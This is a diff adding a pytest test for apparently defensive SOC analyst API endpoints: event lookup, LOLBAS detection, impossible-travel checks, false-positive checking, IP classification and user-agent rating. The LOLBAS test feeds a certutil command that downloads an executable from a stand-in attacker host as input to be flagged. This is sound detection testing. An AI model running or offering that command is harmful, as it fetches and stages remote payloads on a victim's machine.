@@ -317,6 +317,42 @@ def test_scan_airgapped_mode():
     assert data["results"][0]["vt_stats"] == "Suppressed"
 
 
+def test_soc_l1_api_endpoints():
+    # 1. Event Lookup
+    res_ev = client.post("/api/soc/event-lookup", json={"query": "0xC000006D"})
+    assert res_ev.status_code == 200
+    assert len(res_ev.json()["matched_ntstatus"]) > 0
+
+    # 2. LOLBAS
+    res_lol = client.post("/api/soc/lolbas", json={"command": "certutil -urlcache -split -f http://evil.com/a.exe a.exe"})
+    assert res_lol.status_code == 200
+    assert res_lol.json()["is_lolbas"] is True
+
+    # 3. Impossible Travel
+    res_tr = client.post("/api/soc/impossible-travel", json={
+        "lat1": -6.2088, "lon1": 106.8456, "time1": "2026-10-13T08:00:00Z",
+        "lat2": 50.1109, "lon2": 8.6821, "time2": "2026-10-13T08:30:00Z"
+    })
+    assert res_tr.status_code == 200
+    assert res_tr.json()["is_impossible"] is True
+
+    # 4. FP Checker
+    res_fp = client.post("/api/soc/fp-check", json={"indicator": "update.microsoft.com"})
+    assert res_fp.status_code == 200
+    assert res_fp.json()["is_likely_false_positive"] is True
+
+    # 5. IP Classifier
+    res_ip = client.post("/api/soc/ip-classify", json={"ip": "1.1.1.1", "asn": "AS13335 Cloudflare"})
+    assert res_ip.status_code == 200
+    assert "classification" in res_ip.json()
+
+    # 6. User-Agent Dissector
+    res_ua = client.post("/api/soc/user-agent", json={"user_agent": "sqlmap/1.5"})
+    assert res_ua.status_code == 200
+    assert res_ua.json()["threat_level"] == "CRITICAL"
+
+
+
 
 
 
